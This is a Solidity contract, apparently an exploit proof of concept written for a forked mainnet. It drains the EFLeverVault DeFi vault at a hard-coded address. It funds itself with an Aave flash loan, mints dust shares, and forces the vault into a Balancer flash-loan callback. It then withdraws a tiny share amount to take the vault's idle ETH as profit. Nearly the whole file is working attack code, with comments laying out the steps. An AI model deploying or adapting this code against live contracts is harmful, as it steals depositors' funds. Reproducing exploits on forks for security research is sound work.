pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IEFLeverVault {
    function ef_token() external view returns (address);
    function balancer() external view returns (address);
    function weth() external view returns (address);
    function mlr() external view returns (uint256);
    function getFeeParam() external view returns (uint256);
    function getVolume() external view returns (uint256);
    function getDebt() external view returns (uint256);
    function is_paused() external view returns (bool);
    function deposit(uint256 amount) external payable;
    function withdraw(uint256 amount) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IAaveV2Like {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xe39fd820B58f83205Db1D9225f28105971c3D309;
    address public constant AAVE_V2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal _profitAmount;
    bool public attempted;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!attempted, "already attempted");
        attempted = true;

        IEFLeverVault vault = IEFLeverVault(TARGET);
        require(!vault.is_paused(), "vault paused at fork");

        uint256 startingWealth = _totalWealthInEthTerms();
        IERC20Like efToken = IERC20Like(vault.ef_token());

        if (efToken.balanceOf(address(this)) == 0) {
            uint256 directSeed = _findMinimumPositiveShareDeposit(vault, efToken, address(this).balance);
            if (directSeed != 0) {
                vault.deposit{value: directSeed}(directSeed);
                require(efToken.balanceOf(address(this)) > 0, "deposit minted no ef_token dust");
            } else {
                // The mandated strategy for this attempt prefers direct execution
                // with verifier-held assets first. Only when the verifier starts
                // unfunded do we take a temporary public flash loan to complete
                // exploit-path step 1 (acquire a minimal positive `ef_token`
                // balance). That bootstrap path performs the forced Balancer
                // callback and dust-share sweep inside `executeOperation()` so
                // the flash loan can be repaid atomically.
                _bootstrapDustShares(vault, efToken);
                _finalizeProfit(startingWealth);
                return;
            }
        }

        require(_searchAndExploit(vault, efToken), "no viable forced-unwind path");
        _finalizeProfit(startingWealth);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_V2, "only aave");
        require(initiator == address(this), "bad initiator");
        require(assets.length == 1 && amounts.length == 1 && premiums.length == 1, "bad flashloan arrays");
        require(assets[0] == WETH, "unexpected seed asset");

        uint256 seedEth = abi.decode(params, (uint256));
        require(seedEth == amounts[0], "seed mismatch");

        IEFLeverVault vault = IEFLeverVault(TARGET);
        IERC20Like efToken = IERC20Like(vault.ef_token());

        IWETHLike(WETH).withdraw(seedEth);
        vault.deposit{value: seedEth}(seedEth);
        require(efToken.balanceOf(address(this)) > 0, "seed deposit minted no shares");

        // The extra Aave step is only bootstrap funding for exploit-path step 1
        // when the verifier starts with zero ETH on the fork. The core causality
        // is unchanged:
        // 1) acquire a tiny positive ef_token balance,
        // 2) publicly trigger Balancer.flashLoan(vault, [WETH], [amount], "0x2"),
        // 3) leave shared ETH sitting idle inside the vault,
        // 4) withdraw a tiny share amount and receive the vault's full ETH balance.
        require(_searchAndExploit(vault, efToken), "bootstrap exploit failed");

        uint256 repayment = amounts[0] + premiums[0];
        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        if (wethBalance < repayment) {
            uint256 shortfall = repayment - wethBalance;
            require(address(this).balance >= shortfall, "insufficient exploit proceeds");
            IWETHLike(WETH).deposit{value: shortfall}();
        }

        require(IERC20Like(WETH).approve(AAVE_V2, repayment), "approve failed");
        return true;
    }

    function attemptForcedUnwind(uint256 forcedLoanAmount) external {
        require(msg.sender == address(this), "self only");

        IEFLeverVault vault = IEFLeverVault(TARGET);
        IERC20Like efToken = IERC20Like(vault.ef_token());

        uint256 shareBalance = efToken.balanceOf(address(this));
        require(shareBalance > 0, "no ef_token dust");

        uint256 debtBefore = vault.getDebt();
        uint256 totalSupply = efToken.totalSupply();
        require(debtBefore > 0, "no debt");
        require(totalSupply > 0, "no supply");
        require(forcedLoanAmount > 0 && forcedLoanAmount < debtBefore, "bad forced amount");

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = vault.weth();
        amounts[0] = forcedLoanAmount;

        // The failure logs show that trying to make the follow-up withdraw use a
        // zero-sized nested Balancer loan is infeasible on this fork: the vault
        // still enters receiveFlashLoan("0x2") and its internal Aave repay(0)
        // path reverts. So we preserve the same exploit path but pick the
        // smallest dust withdrawal that still implies a strictly positive nested
        // loan amount.
        IBalancerVaultLike(vault.balancer()).flashLoan(TARGET, tokens, amounts, bytes("0x2"));

        require(address(TARGET).balance > 0, "forced unwind left no idle ETH");

        uint256 residualDebt = vault.getDebt();
        require(residualDebt > 0 && residualDebt < debtBefore, "unexpected residual debt");

        uint256 dustAmount = _minimumDustForPositiveNestedLoan(totalSupply, residualDebt);
        require(dustAmount <= shareBalance, "dust shares too small for positive nested loan");
        require((residualDebt * dustAmount) / totalSupply > 0, "nested loan still zero");

        vault.withdraw(dustAmount);
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _bootstrapDustShares(IEFLeverVault vault, IERC20Like efToken) internal {
        uint256 seedCap = _seedFundingUpperBound(vault, efToken);
        uint256 seedEth = _findMinimumPositiveShareDeposit(vault, efToken, seedCap);
        require(seedEth != 0, "dust share seed unavailable");

        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);

        assets[0] = WETH;
        amounts[0] = seedEth;
        modes[0] = 0;

        IAaveV2Like(AAVE_V2).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            abi.encode(seedEth),
            0
        );
    }

    function _searchAndExploit(IEFLeverVault vault, IERC20Like efToken) internal returns (bool) {
        uint256 debtBefore = vault.getDebt();
        uint256 shareBalance = efToken.balanceOf(address(this));

        require(shareBalance > 0, "no positive ef_token balance");
        require(debtBefore > 1, "no outstanding debt to unwind at fork");

        uint16[16] memory bps = [9500, 9000, 8500, 8000, 7500, 7000, 6500, 6000, 5000, 4000, 3000, 2000, 1000, 500, 100, 10];

        for (uint256 i = 0; i < bps.length; i++) {
            uint256 forcedLoanAmount = (debtBefore * bps[i]) / 10000;
            if (forcedLoanAmount == 0 || forcedLoanAmount >= debtBefore) {
                continue;
            }

            try this.attemptForcedUnwind(forcedLoanAmount) {
                return true;
            } catch {}
        }

        if (debtBefore > 1) {
            try this.attemptForcedUnwind(debtBefore - 1) {
                return true;
            } catch {}
        }

        return false;
    }

    function _finalizeProfit(uint256 startingWealth) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }

        uint256 endingWealth = IERC20Like(WETH).balanceOf(address(this));
        if (endingWealth > startingWealth) {
            _profitAmount = endingWealth - startingWealth;
        } else {
            _profitAmount = 0;
        }
    }

    function _totalWealthInEthTerms() internal view returns (uint256) {
        return address(this).balance + IERC20Like(WETH).balanceOf(address(this));
    }

    function _minimumDustForPositiveNestedLoan(uint256 totalSupply, uint256 residualDebt) internal pure returns (uint256) {
        uint256 dustAmount = totalSupply / residualDebt;
        unchecked {
            dustAmount += 1;
        }
        if (dustAmount == 0) {
            return type(uint256).max;
        }
        return dustAmount;
    }

    function _seedFundingUpperBound(IEFLeverVault vault, IERC20Like efToken) internal view returns (uint256) {
        uint256 volumeBefore = vault.getVolume();
        uint256 totalSupply = efToken.totalSupply();

        if (volumeBefore < 1e9) {
            return 1e16;
        }

        if (totalSupply == 0) {
            return volumeBefore + 1 ether;
        }

        uint256 approxNetForOneShareUnit = volumeBefore / totalSupply;
        if (volumeBefore % totalSupply != 0) {
            approxNetForOneShareUnit += 1;
        }

        uint256 floorAmount = approxNetForOneShareUnit + 1;
        if (floorAmount < 1e12) {
            floorAmount = 1e12;
        }

        uint256 cap = floorAmount;
        if (cap < 1e16) {
            cap = 1e16;
        }
        if (cap < 1 ether) {
            cap = 1 ether;
        }
        if (cap > volumeBefore + 1 ether) {
            cap = volumeBefore + 1 ether;
        }
        return cap;
    }

    function _findMinimumPositiveShareDeposit(
        IEFLeverVault vault,
        IERC20Like efToken,
        uint256 maxAvailableEth
    ) internal view returns (uint256) {
        uint256 minimum = _minimumInitialDeposit(vault);
        if (minimum == 0) {
            minimum = 1;
        }
        if (minimum > maxAvailableEth) {
            return 0;
        }

        uint256 amount = minimum;
        for (uint256 i = 0; i < 64; i++) {
            if (_previewMint(vault, efToken, amount) > 0) {
                return amount;
            }
            if (amount > maxAvailableEth / 2) {
                break;
            }
            amount *= 2;
        }

        if (_previewMint(vault, efToken, maxAvailableEth) > 0) {
            return maxAvailableEth;
        }
        return 0;
    }

    function _minimumInitialDeposit(IEFLeverVault vault) internal view returns (uint256) {
        uint256 volumeBefore = vault.getVolume();
        if (volumeBefore < 1e9) {
            return 1e16;
        }
        return 1;
    }

    function _previewMint(
        IEFLeverVault vault,
        IERC20Like efToken,
        uint256 amount
    ) internal view returns (uint256 minted) {
        if (amount == 0) {
            return 0;
        }

        uint256 volumeBefore = vault.getVolume();
        uint256 feePara = vault.getFeeParam();
        uint256 mlrValue = vault.mlr();
        if (feePara <= mlrValue) {
            return 0;
        }

        uint256 loanAmount = (mlrValue * amount) / (feePara - mlrValue);
        uint256 feeAmount = (loanAmount * (feePara - 10000)) / 10000;
        if (amount <= feeAmount) {
            return 0;
        }

        uint256 netAmount = amount - feeAmount;
        uint256 totalSupply = efToken.totalSupply();

        if (volumeBefore < 1e9) {
            return netAmount;
        }
        if (totalSupply == 0 || volumeBefore == 0) {
            return 0;
        }
        minted = (netAmount * totalSupply) / volumeBefore;
    }
}
